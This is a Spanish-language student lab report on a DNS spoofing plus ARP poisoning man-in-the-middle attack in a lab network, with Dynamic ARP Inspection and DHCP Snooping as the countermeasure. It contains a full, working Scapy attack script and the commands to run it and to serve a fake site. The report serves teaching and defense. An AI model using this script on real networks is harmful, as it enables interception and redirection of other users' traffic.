# Ataque DNS Spoofing + ARP Poisoning MitM

**Nombre:** Henry Vicente Quezada | **Matrícula:** 2025-1332 | **Fecha:** 12 de Junio 2026

---

## 🎬 Video Demostrativo

https://youtu.be/TU_LINK_AQUI

---

## 1. Objetivo del Laboratorio

Demostrar cómo un atacante puede interceptar consultas DNS de las víctimas mediante ARP Poisoning (MitM) y responderlas con IPs falsas, redirigiendo el tráfico hacia un servidor web falso controlado por el atacante, y aplicar DAI + DHCP Snooping como contramedida.

---

## 2. Objetivo del Script

Combinar ARP Poisoning con sniffing de paquetes DNS para interceptar consultas hacia `itla.edu.do` y responder con la IP del atacante (`10.13.32.50`), redirigiendo a la víctima a un sitio web falso servido por Kali.

### 2.1 Parámetros Usados

| Parámetro  | Descripción                          | Ejemplo        |
| ---------- | ------------------------------------ | -------------- |
| `interfaz` | Interfaz de red del atacante         | `eth0`         |
| `gateway`  | IP del gateway                       | `10.13.32.1`   |
| `victima`  | IP de la víctima                     | `10.13.32.11`  |
| `DOMINIO`  | Dominio a falsificar (en el script)  | `itla.edu.do`  |
| `IP_FALSA` | IP falsa a devolver                  | `10.13.32.50`  |

### 2.2 Requisitos

- Sistema operativo: **Kali Linux**
- Python 3.x
- Librería Scapy: `pip install scapy`
- Permisos de root: `sudo`
- IP forwarding habilitado (el script lo activa automáticamente)
- Servidor web falso activo en puerto 80 (`python3 -m http.server`)

---

## 3. Funcionamiento del Script

1. Obtiene la MAC real de la víctima y del gateway mediante ARP
2. Habilita IP forwarding para mantener conectividad en la red
3. Lanza hilo de ARP Poisoning: envenena víctima y gateway cada 2 segundos
4. Escucha en el puerto UDP 53 (DNS) con Scapy `sniff()`
5. Al interceptar una query para `itla.edu.do`, construye respuesta DNS falsa con `IP_FALSA`
6. Al detener con `Ctrl+C`, restaura las tablas ARP originales

```
Crear y guardar el script:
bash
nano /home/kali-linux/HenryVicenteQuezada_2025-1332_dns_spoofing.py

Dar permisos de ejecución:
bash
chmod +x /home/kali-linux/HenryVicenteQuezada_2025-1332_dns_spoofing.py

Pasos de ejecución:

Paso 1 — Kali: Levantar el servidor web falso
bash
mkdir -p /tmp/sitio_falso
cat > /tmp/sitio_falso/index.html << 'EOF'
<!DOCTYPE html><html>
<head><title>ITLA - SPOOFED</title></head>
<body style="background:#cc0000;color:white;text-align:center">
  <h1>SITIO FALSO — DNS SPOOFING</h1>
  <h2>Henry Vicente Quezada | 2025-1332</h2>
</body></html>
EOF
cd /tmp/sitio_falso && sudo python3 -m http.server 80 &

Paso 2 — VPC10: Verificar DNS real antes del ataque
bash
nslookup itla.edu.do 10.13.32.1

Paso 3 — Kali: Habilitar IP Forwarding
bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

Paso 4 — Kali: Ejecutar el ataque
bash
sudo python3 /home/kali-linux/HenryVicenteQuezada_2025-1332_dns_spoofing.py eth0 10.13.32.1 10.13.32.11

Paso 5 — Kali: Abrir Wireshark para capturar tráfico DNS
bash
sudo wireshark &
Filtro: dns

Paso 6 — VPC10: Probar el DNS Spoofing
bash
nslookup itla.edu.do

Paso 7 — VPC10: Verificar que llega al sitio falso
bash
curl http://itla.edu.do

Paso 8 — SW1: Aplicar contramedida
conf t
ip dhcp snooping
ip dhcp snooping vlan 10
ip dhcp snooping vlan 20
no ip dhcp snooping information option
interface e0/0
ip dhcp snooping trust
ip arp inspection trust
exit
ip arp inspection vlan 10
ip arp inspection vlan 20
end
write memory

Paso 9 — Kali: Ejecutar el ataque de nuevo
bash
sudo python3 /home/kali-linux/HenryVicenteQuezada_2025-1332_dns_spoofing.py eth0 10.13.32.1 10.13.32.11

Paso 10 — SW1: Verificar que el ARP Poison fue bloqueado
bash
show ip arp inspection
show ip arp inspection statistics
show ip arp inspection vlan 10

🐍 Script — HenryVicenteQuezada_2025-1332_dns_spoofing.py
python
 #!/usr/bin/env python3
# =============================================================
# Nombre:     Henry Vicente Quezada
# Matricula:  2025-1332
# Ataque:     DNS Spoofing + ARP Poisoning MitM
# Fecha:      2026
# =============================================================
"""
ADVERTENCIA: Solo para uso en entornos controlados y con
autorización explícita. Laboratorio académico ITLA.

Topología:
  Víctima  : 10.13.32.X   (Windows VPC)
  Atacante : 10.13.32.5   (Kali)
  IP Falsa : 10.13.32.50  (servidor web falso, alias en Kali)
  Gateway  : 10.13.32.1   (R1 - VLAN 10)

Ejecución (como root):
  sudo python3 HenryVicenteQuezada_2025-1332_dns_spoofing.py
"""

import sys
import time
import signal
import threading
from scapy.all import (
    ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR,
    send, srp, sniff, get_if_hwaddr
)

# ─── Configuración de red ─────────────────────────────────
IFACE        = "eth0"
VICTIMA_IP   = "10.13.32.X"     # <-- AJUSTAR a la IP real del Windows
ROUTER_IP    = "10.13.32.1"
SERVIDOR_IP  = "10.13.32.50"    # IP falsa servida por Kali
DOMINIO_FAKE = "itla.edu.do"
TTL_FAKE     = 300
ARP_INTERVAL = 2

# ─── Obtener MACs ──────────────────────────────────────────
def get_mac(ip: str) -> str:
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = broadcast / arp_req
    ans, _ = srp(pkt, timeout=2, iface=IFACE, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    raise RuntimeError(f"[!] No se pudo obtener la MAC de {ip}")

# ─── ARP Poisoning ──────────────────────────────────────────
def arp_poison(target_ip, target_mac, spoof_ip):
    pkt = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=get_if_hwaddr(IFACE)
    )
    send(pkt, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    pkt = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    send(pkt, count=5, verbose=False)

def arp_poison_loop(victima_mac, router_mac, stop_event):
    print(f"[*] Iniciando ARP poisoning cada {ARP_INTERVAL}s...")
    while not stop_event.is_set():
        arp_poison(VICTIMA_IP, victima_mac, ROUTER_IP)
        arp_poison(ROUTER_IP, router_mac, VICTIMA_IP)
        time.sleep(ARP_INTERVAL)

# ─── DNS Spoofing ───────────────────────────────────────────
def dns_spoof_handler(pkt):
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
        return

    qname = pkt[DNS].qd.qname.decode().rstrip(".")
    if DOMINIO_FAKE not in qname:
        return

    print(f"  [+] DNS query interceptada: {qname}  ->  respondiendo con {SERVIDOR_IP}")

    dns_response = (
        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
        DNS(
            id=pkt[DNS].id,
            qr=1,
            aa=1,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=pkt[DNS].qd.qname,
                type="A",
                ttl=TTL_FAKE,
                rdata=SERVIDOR_IP
            )
        )
    )
    send(dns_response, verbose=False, iface=IFACE)

def start_dns_sniffer():
    filtro_bpf = f"udp port 53 and src host {VICTIMA_IP}"
    print(f"[*] Escuchando DNS queries de {VICTIMA_IP} (filtro: {filtro_bpf})")
    sniff(iface=IFACE, filter=filtro_bpf, prn=dns_spoof_handler, store=0)

# ─── IP Forwarding ───────────────────────────────────────────
def enable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[*] IP forwarding habilitado.")

def disable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    print("[*] IP forwarding deshabilitado.")

# ─── Main ────────────────────────────────────────────────────
def main():
    print("=" * 60)
    print("  DNS Spoofing + ARP Poisoning - Henry Vicente Quezada 2025-1332")
    print("=" * 60)

    print(f"[*] Resolviendo MAC de la víctima ({VICTIMA_IP})...")
    victima_mac = get_mac(VICTIMA_IP)
    print(f"    -> {victima_mac}")

    print(f"[*] Resolviendo MAC del gateway ({ROUTER_IP})...")
    router_mac = get_mac(ROUTER_IP)
    print(f"    -> {router_mac}")

    enable_ip_forward()

    stop_event = threading.Event()
    arp_thread = threading.Thread(
        target=arp_poison_loop,
        args=(victima_mac, router_mac, stop_event),
        daemon=True
    )
    arp_thread.start()

    def shutdown(sig, frame):
        print("\n[!] Deteniendo ataque y restaurando tablas ARP...")
        stop_event.set()
        restore_arp(VICTIMA_IP, victima_mac, ROUTER_IP, router_mac)
        restore_arp(ROUTER_IP, router_mac, VICTIMA_IP, victima_mac)
        disable_ip_forward()
        print("[OK] Tablas ARP restauradas. Saliendo.")
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    print(f"\n[*] Objetivo DNS: {DOMINIO_FAKE} -> {SERVIDOR_IP}")
    print("[*] Presiona Ctrl+C para detener y restaurar la red.\n")
    start_dns_sniffer()


if __name__ == "__main__":
    if not sys.platform.startswith("linux"):
        print("[!] Este script está diseñado para Linux.")
        sys.exit(1)
    main()

🛡️ Contramedida aplicada
SW1(config)# ip dhcp snooping
SW1(config)# ip dhcp snooping vlan 10
SW1(config)# ip dhcp snooping vlan 20
SW1(config)# no ip dhcp snooping information option
SW1(config)# interface e0/0
SW1(config-if)# ip dhcp snooping trust
SW1(config-if)# ip arp inspection trust
SW1(config-if)# exit
SW1(config)# ip arp inspection vlan 10
SW1(config)# ip arp inspection vlan 20
SW1(config)# end
SW1# write memory
! Verificación
SW1# show ip arp inspection
SW1# show ip arp inspection statistics
SW1# show ip arp inspection vlan 10
SW1# show ip dhcp snooping binding
```

---

## 4. Documentación de la Red

### Topología

<img width="896" height="720" alt="image" src="https://github.com/user-attachments/assets/14f9603b-e415-4304-b482-96c21c4c75e9" />

### Tabla de Direccionamiento

| Dispositivo | Interfaz | VLAN | IP          | Máscara | Rol                      |
| ----------- | -------- | ---- | ----------- | ------- | ------------------------ |
| R1          | e0/0.10  | 10   | 10.13.32.1  | /24     | Gateway VLAN10 TI        |
| R1          | e0/0.20  | 20   | 10.13.33.1  | /24     | Gateway VLAN20 Gerencia  |
| R1          | e0/0.99  | 99   | 10.13.99.1  | /24     | Gateway Management       |
| SW1         | vlan 99  | 99   | 10.13.99.2  | /24     | Gestión Switch VTP Server|
| SW2         | vlan 99  | 99   | 10.13.99.3  | /24     | Gestión Switch VTP Client|
| VPC10       | eth0     | 10   | 10.13.32.11 | /24     | Cliente TI / Víctima     |
| VPC20       | eth0     | 20   | 10.13.33.11 | /24     | Cliente Gerencia         |
| Kali        | eth0     | 10   | 10.13.32.5  | /24     | **Atacante**             |

### VLANs

| VLAN | Nombre     | Descripción                    |
| ---- | ---------- | ------------------------------ |
| 10   | TI         | Red de usuarios TI             |
| 20   | Gerencia   | Red de Gerencia                |
| 99   | Management | Red de gestión de dispositivos |

### Interfaces SW1

| Puerto | Modo         | VLAN     | Conectado a |
| ------ | ------------ | -------- | ----------- |
| e0/0   | Trunk 802.1q | 10,20,99 | R1          |
| e0/1   | Trunk 802.1q | 10,20,99 | SW2 e0/0    |

---

## 5. Capturas de Pantalla

### Antes del ataque

![antes](PEGA_IMAGEN_AQUI)

📷 VPC10# nslookup itla.edu.do — Responde con IP real

### Script en ejecución

![script](PEGA_IMAGEN_AQUI)

📷 Kali ejecutando dns_spoofing.py — ARP Poisoning activo

### Durante el ataque

![durante](PEGA_IMAGEN_AQUI)

📷 VPC10# nslookup itla.edu.do — Responde con 10.13.32.50 (IP falsa) ✅

### Contramedida aplicada

![contramedida](PEGA_IMAGEN_AQUI)

📷 SW1# show ip arp inspection statistics — ARPs falsos descartados por DAI ✅

---

DAI valida cada paquete ARP contra la tabla de DHCP Snooping. Los ARPs falsos de Kali son descartados porque no existe un binding válido para su MAC/IP. Sin ARP Poisoning el tráfico DNS no pasa por Kali, eliminando completamente el vector de DNS Spoofing.
